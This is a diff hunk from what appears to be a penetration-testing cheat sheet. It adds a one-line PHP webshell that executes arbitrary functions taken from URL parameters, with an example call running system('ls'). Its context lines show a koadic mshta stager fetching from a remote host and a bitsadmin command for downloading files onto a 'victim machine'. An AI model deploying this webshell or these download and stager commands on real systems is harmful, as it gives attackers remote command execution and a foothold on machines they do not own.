@@ -1846,7 +1846,11 @@ $ ./koadic
 [>] mshta http://192.168.1.11:1245/c26qp
 
 ```
-
+# PHP tiny webshell
+```
+<?= ($_=@$_GET[0]).$_(@$_GET[1]);
+```
+run is whith http://127.0.0.1/shell.php?0=system&1=ls
 # Donwload file to the victim machine
 ```
 bitsadmin  /transfer mydownloadjob  /download  /priority normal  ^http://example.com/filename.zip  C:\Users\username\Downloads\filename.zip
